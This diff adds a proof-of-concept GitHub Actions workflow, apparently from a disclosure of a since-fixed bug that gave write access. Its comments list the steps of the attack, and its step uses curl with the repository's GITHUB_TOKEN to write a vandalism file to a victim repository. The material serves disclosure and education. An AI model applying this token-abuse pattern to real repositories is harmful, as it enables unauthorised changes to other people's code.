@@ -1,0 +1,29 @@
+# This is a proof-of-concept for a security bug in GitHub Actions which has since been fixed.
+# See https://blog.teddykatz.com/2021/03/17/github-actions-write-access.html for more information.
+# The proof-of-concept was only ever used in a test environment to validate the existence of the
+# vulnerability, and is shown here for educational purposes.
+#
+# The proof-of-concept would have the effect of creating a `vandalism.md` file, containing vandalism,
+# on the default branch of a victim repository.
+#
+# To use the proof-of-concept, the steps would have been:
+# 1. Fork the victim repository
+# 2. Create a pull request from the fork to the victim repository, making any change
+# 3. Put this yml file (`vandalism.yml`) in the `.github/workflows/` folder, and commit it to a different branch of the fork
+# 4. Use the GraphQL API to set the `baseRefName` of the pull request from (2) to the commit hash from (3)
+
+name: "Proof-of-concept GitHub Actions workflow"
+
+on:
+  issue_comment:
+    types: [created, deleted]
+
+jobs:
+  vandalize-repo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Vandalize
+        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/$REPO/contents/vandalism.md" --data ''{"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}'' '
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
